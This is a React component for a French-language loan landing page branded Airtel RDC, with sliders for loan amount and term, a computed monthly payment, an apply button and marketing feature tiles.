import React, { useState } from "react";
import { calculateMonthlyPayment } from "../utils/formatters";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { LandingPageProps } from "../types";

function LandingPage({ onApply }: LandingPageProps) {
    const [loanAmount, setLoanAmount] = useState(5000);
    const [loanTerm, setLoanTerm] = useState(12);

    const monthlyPayment = calculateMonthlyPayment(loanAmount, loanTerm);

    return (
        <div style={pageStyle}>
            <div style={headerStyle}>
                <img src="/airtel.svg" alt="Airtel RDC" style={logoStyle} />
                <button
                    style={menuButtonStyle}
                    onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                    onMouseOut={(e) => (e.currentTarget.style.background = "none")}
                >
                    ☰
                </button>
            </div>

            <div style={contentStyle}>
                <div style={{ ...cardStyle, maxWidth: "580px" }}>
                    <h1
                        style={{
                            textAlign: "center",
                            fontSize: "32px",
                            fontWeight: "700",
                            marginBottom: "12px",
                            color: "#1a1a1a",
                            letterSpacing: "-0.5px",
                        }}
                    >
                        Obtenez votre prêt rapidement
                    </h1>
                    <p
                        style={{
                            textAlign: "center",
                            color: "#666",
                            marginBottom: "36px",
                            fontSize: "16px",
                            lineHeight: "1.5",
                        }}
                    >
                        Approbation rapide • Taux compétitifs • Conditions flexibles
                    </p>

                    <div
                        style={{
                            background: "linear-gradient(135deg, #f5f7fa 0%, #f0f3f7 100%)",
                            padding: "24px 16px",
                            borderRadius: "12px",
                            marginBottom: "32px",
                            border: "1px solid #e8ecf1",
                        }}
                    >
                        <h3
                            style={{
                                fontSize: "20px",
                                marginBottom: "24px",
                                color: "#1a1a1a",
                                fontWeight: "700",
                            }}
                        >
                            Calculateur de prêt
                        </h3>

                        <div style={{ marginBottom: "24px" }}>
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "space-between",
                                    marginBottom: "12px",
                                }}
                            >
                                <span
                                    style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                                >
                                    Montant du prêt
                                </span>
                                <span
                                    style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
                                >
                                    ${loanAmount.toLocaleString()}
                                </span>
                            </div>
                            <input
                                type="range"
                                min="100"
                                max="5000"
                                step="100"
                                value={loanAmount}
                                onChange={(e) => setLoanAmount(Number(e.target.value))}
                                style={{
                                    width: "100%",
                                    height: "8px",
                                    cursor: "pointer",
                                    accentColor: "#e40000",
                                }}
                            />
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "space-between",
                                    fontSize: "13px",
                                    color: "#888",
                                    marginTop: "8px",
                                    fontWeight: "500",
                                }}
                            >
                                <span>$100</span>
                                <span>$5,000</span>
                            </div>
                        </div>

                        <div style={{ marginBottom: "24px" }}>
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "space-between",
                                    marginBottom: "12px",
                                }}
                            >
                                <span
                                    style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                                >
                                    Durée du prêt
                                </span>
                                <span
                                    style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
                                >
                                    {loanTerm} mois
                                </span>
                            </div>
                            <input
                                type="range"
                                min="6"
                                max="60"
                                step="6"
                                value={loanTerm}
                                onChange={(e) => setLoanTerm(Number(e.target.value))}
                                style={{
                                    width: "100%",
                                    height: "8px",
                                    cursor: "pointer",
                                    accentColor: "#e40000",
                                }}
                            />
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "space-between",
                                    fontSize: "13px",
                                    color: "#888",
                                    marginTop: "8px",
                                    fontWeight: "500",
                                }}
                            >
                                <span>6 mois</span>
                                <span>60 mois</span>
                            </div>
                        </div>

                        <div
                            style={{
                                background: "white",
                                padding: "20px 24px",
                                borderRadius: "10px",
                                display: "flex",
                                justifyContent: "space-between",
                                alignItems: "center",
                                boxShadow: "0 2px 8px rgba(0,0,0,0.06)",
                            }}
                        >
                            <span
                                style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                            >
                                Paiement mensuel
                            </span>
                            <span
                                style={{ fontSize: "28px", fontWeight: "700", color: "#e40000" }}
                            >
                                ${monthlyPayment.toFixed(2)}
                            </span>
                        </div>
                    </div>

                    <button
                        onClick={onApply}
                        style={buttonStyle}
                        onMouseOver={(e) => {
                            e.currentTarget.style.transform = "translateY(-2px)";
                            e.currentTarget.style.boxShadow =
                                "0 6px 20px rgba(228, 0, 0, 0.4)";
                        }}
                        onMouseOut={(e) => {
                            e.currentTarget.style.transform = "translateY(0)";
                            e.currentTarget.style.boxShadow =
                                "0 4px 12px rgba(228, 0, 0, 0.3)";
                        }}
                    >
                        DEMANDER MAINTENANT
                    </button>

                    <div
                        style={{
                            display: "grid",
                            gridTemplateColumns: "repeat(3, 1fr)",
                            gap: "20px",
                            marginTop: "36px",
                            paddingTop: "36px",
                            borderTop: "2px solid #f0f0f0",
                        }}
                    >
                        <div style={{ textAlign: "center" }}>
                            <div style={{ fontSize: "32px", marginBottom: "10px" }}>⚡</div>
                            <div
                                style={{
                                    fontSize: "14px",
                                    fontWeight: "700",
                                    color: "#333",
                                    marginBottom: "6px",
                                }}
                            >
                                Approbation rapide
                            </div>
                            <div style={{ fontSize: "12px", color: "#777" }}>
                                En moins de 24h
                            </div>
                        </div>
                        <div style={{ textAlign: "center" }}>
                            <div style={{ fontSize: "32px", marginBottom: "10px" }}>💰</div>
                            <div
                                style={{
                                    fontSize: "14px",
                                    fontWeight: "700",
                                    color: "#333",
                                    marginBottom: "6px",
                                }}
                            >
                                Taux bas
                            </div>
                            <div style={{ fontSize: "12px", color: "#777" }}>À partir de 8%</div>
                        </div>
                        <div style={{ textAlign: "center" }}>
                            <div style={{ fontSize: "32px", marginBottom: "10px" }}>🔒</div>
                            <div
                                style={{
                                    fontSize: "14px",
                                    fontWeight: "700",
                                    color: "#333",
                                    marginBottom: "6px",
                                }}
                            >
                                Sécurisé
                            </div>
                            <div style={{ fontSize: "12px", color: "#777" }}>Niveau bancaire</div>
                        </div>
                    </div>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Airtel RDC</div>
        </div>
    );
}

export default LandingPage;
